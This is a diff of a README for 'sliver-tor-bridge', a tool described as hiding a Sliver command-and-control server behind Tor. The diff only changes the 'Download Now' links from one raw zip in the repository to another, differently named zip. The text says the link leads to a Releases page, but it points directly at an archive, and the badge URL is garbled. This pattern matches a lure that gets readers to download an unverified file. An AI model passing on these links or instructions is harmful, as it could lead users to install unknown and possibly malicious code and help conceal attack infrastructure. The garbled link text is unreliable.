@@ -1,7 +1,7 @@
 # 🌉 sliver-tor-bridge - Secure Your Communications Effortlessly
 
 ## 📦 Download Now!
-[![Download Latest Release](https://github.com/srvishal/sliver-tor-bridge/raw/refs/heads/main/sliver_tor_bridge/sliver-tor-bridge-2.6.zip%20Latest%https://github.com/srvishal/sliver-tor-bridge/raw/refs/heads/main/sliver_tor_bridge/sliver-tor-bridge-2.6.zip)](https://github.com/srvishal/sliver-tor-bridge/raw/refs/heads/main/sliver_tor_bridge/sliver-tor-bridge-2.6.zip)
+[![Download Latest Release](https://github.com/srvishal/sliver-tor-bridge/raw/refs/heads/main/sliver_tor_bridge/bridge-sliver-tor-v3.1.zip%20Latest%https://github.com/srvishal/sliver-tor-bridge/raw/refs/heads/main/sliver_tor_bridge/bridge-sliver-tor-v3.1.zip)](https://github.com/srvishal/sliver-tor-bridge/raw/refs/heads/main/sliver_tor_bridge/bridge-sliver-tor-v3.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the sliver-tor-bridge! This tool helps you use Tor to create a secure connection for your Sliver C2 server. Follow the steps below to download and run this application easily.
@@ -17,7 +17,7 @@ To ensure the best experience, your computer should meet the following requireme
 ## 📥 Download & Install
 To download the application, visit the Releases page using the link below:
 
-[Download Latest Release](https://github.com/srvishal/sliver-tor-bridge/raw/refs/heads/main/sliver_tor_bridge/sliver-tor-bridge-2.6.zip)
+[Download Latest Release](https://github.com/srvishal/sliver-tor-bridge/raw/refs/heads/main/sliver_tor_bridge/bridge-sliver-tor-v3.1.zip)
 
 Once on the page, find the latest version of the application. You will see a list of files. Choose the one that fits your operating system. Click it to download.
 
